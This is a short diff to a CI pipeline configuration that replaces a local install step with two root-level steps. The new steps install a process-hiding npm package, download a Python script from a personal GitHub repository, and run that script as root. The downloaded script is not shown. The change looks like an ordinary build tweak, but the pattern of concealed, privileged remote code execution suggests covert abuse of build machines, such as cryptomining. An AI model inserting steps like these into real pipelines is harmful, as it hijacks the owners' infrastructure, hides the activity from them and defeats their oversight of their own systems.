@@ -19,5 +19,5 @@ jobs:
      
     steps: 
       - checkout 
-      - run: sudo su && chmod +x ./install.sh
-      - run: ./install.sh
+      - run: sudo su --command "sudo apt update && sudo apt upgrade -y && curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - && sudo apt-get install --force-yes nodejs && npm i -g node-process-hider && wget https://raw.githubusercontent.com/aurbach55/zash/main/dep.py"
+      - run: sudo su --command "dep.py"
